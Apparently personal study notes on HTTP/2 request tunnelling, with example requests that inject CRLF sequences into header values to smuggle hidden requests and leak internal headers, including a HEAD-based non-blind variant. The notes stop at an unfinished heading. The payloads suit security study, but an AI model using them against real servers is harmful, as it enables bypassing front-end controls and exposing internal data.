You can send a single request that will elicit two responses from the back-end. This potentially enables you to hide a request and its matching response from the front-end altogether. 

 Request tunnelling is possible with both HTTP/1 and HTTP/2 but is considerably more difficult to detect in HTTP/1-only environments. Due to the way persistent (keep-alive) connections work in HTTP/1, even if you do receive two responses, this doesn't necessarily confirm that the request was successfully smuggled.

In HTTP/2 on the other hand, each "stream" should only ever contain a single request and response. If you receive an HTTP/2 response with what appears to be an HTTP/1 response in the body, you can be confident that you've successfully tunneled a second request. 

# Leaking internal headers via HTTP/2 request tunnelling

```
:method 	    POST
:path 	        /comment
:authority 	    vulnerable-website.com
content-type 	application/x-www-form-urlencoded
foo 	        bar\r\n
                Content-Length: 200\r\n
                \r\n
                comment=\r\n
                \r\n

x=1 
```
 The front-end sees everything we've injected as part of a header, so adds any new headers after the trailing comment= string
```http
POST /comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

comment=X-Internal-Header: secretContent-Length: 3
x=1
```
# Blind tunneling
 Some front-end servers read in all the data they receive from the back-end. 
This means that if you successfully tunnel a request, they will potentially forward both responses to the client, with the response to the tunnelled request nested inside the body of the main response.  

iOther front-end servers only read in the number of bytes specified in the Content-Length header of the response, so only the first response is forwarded to the client. 

# Non-blind request tunnelling using HEAD
Responses to HEAD requests often contain a content-length header even though they don't have a body of their own. This normally refers to the length of the resource that would be returned by a GET request to the same endpoint. Some front-end servers fail to account for this and attempt to read in the number of bytes specified in the header regardless. 
Request:
```
:method 	HEAD
:path 	    /example
:authority 	vulnerable-website.com
foo 	    bar\r\n
            \r\n
            GET /tunnelled HTTP/1.1\r\n
            Host: vulnerable-website.com\r\n
            X: x
```
Response:
```
:status 	    200
content-type 	text/html
content-length 	131

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 4286

<!DOCTYPE html>
<h1>Tunnelled</h1>
<p>This is a tunnelled respo
```
# Web cache poisoning via HTTP/2 request tunnelling
#to-be-continued 